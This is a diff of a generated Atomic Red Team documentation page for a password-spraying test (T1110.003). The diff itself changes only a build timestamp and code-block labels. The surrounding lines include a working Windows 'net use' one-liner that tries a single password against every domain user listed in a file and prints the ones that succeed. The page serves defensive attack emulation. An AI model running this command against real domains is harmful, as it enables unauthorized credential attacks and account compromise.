@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1110.003"
 attack_technique_name: "Brute Force: Password Spraying"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "90bc2e54-6c84-47a5-9439-0a2a92b4b175"
@@ -54,13 +54,13 @@ List of domain users to password spray must exits at %temp%\users.txt
 
 ### Prerequisite Check
 
-```text
+```untitled
 if not exist %temp%\users.txt (exit /b 1)
 ```
 
 ### Get Prerequisite
 
-```text
+```untitled
 "PathToAtomicsFolder\T1110.003\src\parse_net_users.bat"
 ```
 
@@ -71,7 +71,7 @@ if not exist %temp%\users.txt (exit /b 1)
 
 ### Command
 
-```commandprompt
+```cmd
 @FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "#{password}" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL
 ```
 
